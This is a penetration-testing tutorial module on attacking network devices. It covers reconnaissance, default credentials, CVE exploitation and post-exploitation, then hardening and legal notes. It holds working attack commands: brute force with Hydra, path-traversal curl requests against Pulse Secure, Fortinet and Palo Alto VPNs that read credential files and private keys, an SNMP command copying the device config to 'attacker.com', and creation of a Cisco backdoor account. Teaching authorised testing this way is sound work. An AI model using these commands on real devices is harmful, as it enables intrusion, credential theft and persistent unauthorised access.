# Introduction to Hacking Networking Devices

## Introduction

Network infrastructure devices are critical components that control data flow and security in organizations. This module covers techniques for identifying, accessing, and exploiting vulnerabilities in routers, switches, firewalls, and other network devices.

## Why Target Network Devices?

- **Central Control**: Network devices control all traffic
- **Privileged Access**: Often have elevated permissions
- **Persistence**: Compromised devices provide long-term access
- **Traffic Interception**: Can monitor and modify all network traffic
- **Lateral Movement**: Gateway to entire network segments
- **Often Overlooked**: Security updates frequently neglected

## Common Network Devices

### Routers
- **Purpose**: Route traffic between networks
- **Examples**: Cisco ISR, Juniper MX, Mikrotik
- **Common Ports**: 22 (SSH), 23 (Telnet), 80/443 (Web UI)

### Switches
- **Purpose**: Connect devices within a network
- **Examples**: Cisco Catalyst, HP ProCurve, Arista
- **Common Ports**: 22 (SSH), 23 (Telnet), 161 (SNMP)

### Firewalls
- **Purpose**: Filter and control network traffic
- **Examples**: Palo Alto, Fortinet, pfSense, Cisco ASA
- **Common Ports**: 22 (SSH), 443 (Web UI)

### Load Balancers
- **Purpose**: Distribute traffic across servers
- **Examples**: F5 BIG-IP, HAProxy, Nginx
- **Common Ports**: 22 (SSH), 443 (Management)

### VPN Concentrators
- **Purpose**: Manage remote access connections
- **Examples**: Cisco AnyConnect, Pulse Secure, OpenVPN
- **Common Ports**: 443 (VPN), 4443 (Management)

### Wireless Access Points
- **Purpose**: Provide wireless network access
- **Examples**: Cisco Aironet, Ubiquiti UniFi, Aruba
- **Common Ports**: 22 (SSH), 80/443 (Web UI)

## Network Device Vulnerabilities

### 1. Default Credentials

Many devices ship with default credentials that are never changed.

**Common Defaults:**
```
Cisco: admin/admin, cisco/cisco
Juniper: root/(no password), admin/admin
Mikrotik: admin/(no password)
Fortinet: admin/(no password)
Palo Alto: admin/admin
pfSense: admin/pfsense
```

### 2. Weak Authentication

- No password policies
- Telnet instead of SSH
- HTTP instead of HTTPS
- No multi-factor authentication
- Weak encryption protocols

### 3. Unpatched Vulnerabilities

- Known CVEs not patched
- End-of-life devices still in use
- Firmware updates not applied
- Security advisories ignored

### 4. Misconfigurations

- Unnecessary services enabled
- Weak SNMP community strings
- Open management interfaces
- Permissive access control lists
- Insecure protocols enabled

### 5. Information Disclosure

- Banner grabbing reveals versions
- SNMP exposes configuration
- Error messages leak information
- Debug logs accessible

## Reconnaissance Techniques

### Network Scanning

```bash
# Identify network devices
nmap -sV -p 22,23,80,443,161,8080,8443 target-network/24

# Cisco device detection
nmap -p 22,23,80,443 --script cisco-smart-install target.com

# SNMP enumeration
nmap -sU -p 161 --script snmp-brute,snmp-info target.com

# Identify device type by TTL
# TTL 255 = Cisco/Network device
# TTL 128 = Windows
# TTL 64 = Linux/Unix
```

### Banner Grabbing

```bash
# SSH banner
nc target.com 22

# Telnet banner
nc target.com 23

# HTTP headers
curl -I http://target.com

# Nmap banner grab
nmap -sV --script=banner target.com
```

### SNMP Enumeration

```bash
# SNMPwalk (community string: public)
snmpwalk -v 2c -c public target.com

# Enumerate system information
snmpwalk -v 2c -c public target.com system

# Enumerate network interfaces
snmpwalk -v 2c -c public target.com interfaces

# Brute force community strings
onesixtyone -c community.txt target.com

# Nmap SNMP scripts
nmap -sU -p 161 --script snmp-* target.com
```

### CDP/LLDP Discovery

```bash
# Cisco Discovery Protocol (CDP)
# Requires network access
yersinia -G  # GUI tool for CDP attacks

# LLDP enumeration
nmap --script lldp-discovery target.com
```

## Exploitation Techniques

### 1. Default Credential Attacks

```bash
# Hydra brute force
hydra -L users.txt -P passwords.txt ssh://target.com
hydra -l admin -P passwords.txt http-get://target.com

# Medusa
medusa -h target.com -u admin -P passwords.txt -M ssh

# CrackMapExec (for Windows devices)
crackmapexec smb target.com -u admin -p passwords.txt
```

### 2. Cisco-Specific Attacks

**Smart Install Exploitation**
```bash
# Detect Smart Install
nmap -p 4786 --script cisco-smart-install target.com

# Exploit with SIET (Smart Install Exploitation Tool)
siet.py -i target.com -g  # Get config
siet.py -i target.com -c "show version"  # Execute command
```

**Type 7 Password Cracking**
```bash
# Cisco Type 7 passwords are weakly encrypted
# Example: 094F471A1A0A
# Online tools or scripts can decrypt these instantly

# Python script
python cisco_type7_decrypt.py 094F471A1A0A
```

**SNMP Config Download**
```bash
# Download configuration via SNMP
snmpset -v 2c -c private target.com \
  1.3.6.1.4.1.9.9.96.1.1.1.1.2.111 i 1 \
  1.3.6.1.4.1.9.9.96.1.1.1.1.3.111 i 4 \
  1.3.6.1.4.1.9.9.96.1.1.1.1.4.111 a attacker.com \
  1.3.6.1.4.1.9.9.96.1.1.1.1.5.111 s config.txt
```

### 3. VPN Exploitation

**Pulse Secure CVE-2019-11510**
```bash
# Arbitrary file read
curl "https://target.com/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/"

# Extract credentials
curl "https://target.com/dana-na/../dana/html5acc/guacamole/../../../../../../data/runtime/mtmp/system?/dana/html5acc/guacamole/"
```

**Fortinet SSL VPN Exploits**
```bash
# CVE-2018-13379 - Path traversal
curl "https://target.com/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
```

### 4. Firewall Exploitation

**Palo Alto Firewalls**
```bash
# CVE-2020-2021 - Authentication bypass
curl -k "https://target.com/php?id=../../../../opt/pancfg/mgmt/ssl/private/server.key"
```

**pfSense**
```bash
# Default credentials: admin/pfsense
# Command injection in various versions
# Check for CVEs specific to version
```

### 5. Router Exploitation

**Mikrotik RouterOS**
```bash
# Winbox vulnerability (CVE-2018-14847)
# User enumeration and password extraction

# RouterOS API brute force
python mikrotik_bruteforce.py target.com
```

## Post-Exploitation

### Configuration Extraction

```bash
# Cisco IOS
enable
show running-config
show startup-config

# Juniper JunOS
show configuration

# Mikrotik
/export file=config

# Fortinet
show full-configuration
```

### Credential Extraction

```bash
# Extract hashed passwords from configs
grep -i "password\|secret" config.txt

# Cisco enable secret (Type 5 - MD5)
# Can be cracked with hashcat or john

# Cisco enable password (Type 7)
# Easily decrypted

# Extract SNMP community strings
grep -i "snmp-server community" config.txt
```

### Persistence

```bash
# Create backdoor user (Cisco)
enable
configure terminal
username backdoor privilege 15 secret password123
line vty 0 4
login local

# Schedule task (Cisco)
kron occurrence BACKDOOR at 2:00 recurring
policy-list BACKDOOR_POLICY

# Firmware modification (advanced)
# Requires deep knowledge and access
```

### Traffic Interception

```bash
# Port mirroring (SPAN)
# Cisco example
monitor session 1 source interface Gi0/1
monitor session 1 destination interface Gi0/2

# Capture traffic
tcpdump -i eth0 -w capture.pcap

# ARP spoofing on network
ettercap -T -M arp:remote /target_ip/ /gateway_ip/
```

## Network Device Security Testing Tools

### Specialized Tools

- **RouterSploit**: Exploitation framework for embedded devices
- **Cisco Auditing Tool (CAT)**: Cisco device security scanner
- **Cisco Global Exploiter (CGE)**: Cisco vulnerability scanner
- **SIET**: Smart Install Exploitation Tool
- **Yersinia**: Layer 2 attack framework

### RouterSploit Usage

```bash
# Start RouterSploit
rsf

# Search for exploits
search cisco

# Use exploit
use exploits/routers/cisco/ios_telnet_default

# Set target
set target 192.168.1.1

# Run exploit
run
```

### General Tools

- **Nmap**: Network scanning and enumeration
- **Metasploit**: Exploitation framework
- **Hydra/Medusa**: Brute force tools
- **SNMPwalk**: SNMP enumeration
- **Wireshark**: Traffic analysis

## Common CVEs

### Cisco
- **CVE-2020-3452**: Path traversal in ASA/FTD
- **CVE-2019-1653**: Cisco router information disclosure
- **CVE-2018-0171**: Smart Install remote code execution

### Fortinet
- **CVE-2018-13379**: SSL VPN path traversal
- **CVE-2022-40684**: Authentication bypass

### Pulse Secure
- **CVE-2019-11510**: Arbitrary file reading
- **CVE-2020-8243**: RCE vulnerability

### Palo Alto
- **CVE-2020-2021**: Authentication bypass
- **CVE-2017-15944**: XSS in web interface

## Network Device Hardening

### Best Practices

1. **Change Default Credentials**
   - Use strong, unique passwords
   - Implement password policies
   - Enable multi-factor authentication

2. **Disable Unnecessary Services**
   - Disable Telnet, use SSH only
   - Disable HTTP, use HTTPS only
   - Disable unused protocols (CDP, LLDP if not needed)
   - Remove SNMP if not required

3. **Access Control**
   - Implement ACLs for management access
   - Use VPN for remote management
   - Restrict management to specific IPs
   - Separate management and data planes

4. **Keep Updated**
   - Apply security patches promptly
   - Subscribe to vendor security advisories
   - Replace end-of-life devices
   - Regular firmware updates

5. **Secure SNMP**
   - Use SNMPv3 with authentication
   - Change default community strings
   - Use strong community strings
   - Restrict SNMP access with ACLs

6. **Logging and Monitoring**
   - Enable comprehensive logging
   - Send logs to central SIEM
   - Monitor for suspicious activities
   - Regular log review

7. **Configuration Management**
   - Regular configuration backups
   - Change management process
   - Configuration auditing
   - Version control for configs

## Legal and Ethical Considerations

- **Authorization**: Only test authorized devices
- **Impact**: Network device testing can cause outages
- **Scope**: Clearly define what's in scope
- **Backup**: Ensure configurations are backed up
- **Coordination**: Work with network team
- **Timing**: Test during maintenance windows

## Practical Exercises

1. Scan your lab network for devices
2. Enumerate SNMP information
3. Test default credentials on lab devices
4. Extract and analyze device configurations
5. Practice RouterSploit on vulnerable devices

## Resources

- [RouterSploit](https://github.com/threat9/routersploit)
- [Cisco Security Advisories](https://tools.cisco.com/security/center/publicationListing.x)
- [Fortinet PSIRT](https://www.fortiguard.com/psirt)
- [NIST Network Device Security](https://csrc.nist.gov/publications)
- [CIS Benchmarks](https://www.cisecurity.org/cis-benchmarks/)

## Next Steps

After understanding network device exploitation, you'll learn about wireless network security and building a wireless penetration testing lab.

